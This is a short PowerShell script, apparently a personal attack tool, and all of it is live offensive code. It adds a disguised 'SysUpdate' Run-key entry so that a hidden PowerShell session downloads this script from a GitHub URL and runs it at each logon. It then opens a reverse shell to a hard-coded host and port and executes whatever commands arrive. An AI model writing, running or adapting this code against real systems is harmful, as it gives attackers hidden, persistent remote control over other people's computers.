# shell_v2.ps1 - WORKING VERSION WITH PERSISTENCE LOCKED IN
# DO NOT CHANGE VERSION NUMBER OR pico COMMAND

$LHOST = "192.168.1.15"
$LPORT = 4444
$SCRIPT_URL = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"

# Persistence ONLY (HKCU Run)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$regValue = "powershell -w hidden -nop -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')\""
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null

# EXACT SAME WORKING SHELL FROM V2
$client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

while(1){}
